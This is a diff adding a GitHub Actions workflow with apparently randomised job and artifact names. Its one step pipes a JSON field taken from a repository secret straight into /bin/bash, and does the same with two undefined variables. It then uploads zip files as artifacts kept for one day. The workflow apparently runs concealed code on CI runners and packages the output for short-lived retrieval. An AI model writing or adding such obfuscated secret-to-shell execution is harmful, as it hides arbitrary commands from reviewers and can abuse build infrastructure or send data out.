@@ -1,0 +1,23 @@
+name: virtuallj2570
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: virtuallj2570
+        env:
+          epbz1: ${{ secrets.epbz1 }}
+        run: |
+          printf '%s' "$epbz1" | jq -r .jt054 | /bin/bash
+          echo $i38628 | jq -r .ptei6900 | /bin/bash
+          echo $sq5 | jq -r .cgi9 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: oUv01Db5
+          path: "*.zip"
+          retention-days: 1
